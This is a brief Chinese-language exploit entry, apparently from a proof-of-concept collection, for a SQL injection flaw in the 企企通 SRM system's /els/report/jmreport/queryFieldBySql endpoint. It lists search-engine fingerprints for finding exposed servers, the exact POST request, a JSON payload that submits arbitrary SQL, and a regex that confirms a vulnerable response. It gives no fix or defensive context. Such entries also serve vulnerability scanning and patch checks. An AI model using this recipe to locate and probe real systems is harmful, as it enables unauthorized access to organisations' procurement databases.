# 企企通-queryFieldBySql-SQL注入漏洞

企企通 ｜ SQL注入 ｜ —
- **指纹**：`fofa: body="welcome-srm-wrap" hunter: web.icon="eb7cf31489c9ec6dac1611d452ecafe1" ｜ body="welcome-srm-wrap"`
- **请求**：`POST /els/report/jmreport/queryFieldBySql HTTP/1.1`

**Payload**
```
{"dbSource": "", "sql": "select 1#'"}
```
- **响应特征**：200 ^(?=.*?code)(?=.*?200).*?$